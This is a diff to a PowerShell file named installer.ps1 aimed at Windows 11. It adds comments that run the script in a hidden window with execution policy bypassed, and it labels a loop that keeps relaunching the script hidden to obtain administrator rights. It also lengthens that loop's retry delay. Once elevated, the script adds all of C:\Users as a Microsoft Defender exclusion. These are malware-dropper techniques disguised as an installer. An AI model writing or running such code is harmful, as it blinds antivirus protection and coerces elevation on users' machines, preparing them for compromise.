@@ -1,4 +1,7 @@
+# language: PowerShell, file: installer.ps1, target: Windows 11
+# run hidden: powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File installer.ps1
 
+# --- self-elevate loop ---
 function Test-Admin {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
     (New-Object Security.Principal.WindowsPrincipal $id).IsInRole(
@@ -13,13 +16,13 @@ if (-not (Test-Admin)) {
                 '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$self`""
             ) -Wait
         } catch {
-            Start-Sleep -Milliseconds 20
+            Start-Sleep -Milliseconds 100
         }
     }
     exit
 }
 
-
+# --- admin from here down ---
 
 Add-MpPreference -ExclusionPath 'C:\Users' -ErrorAction SilentlyContinue
 
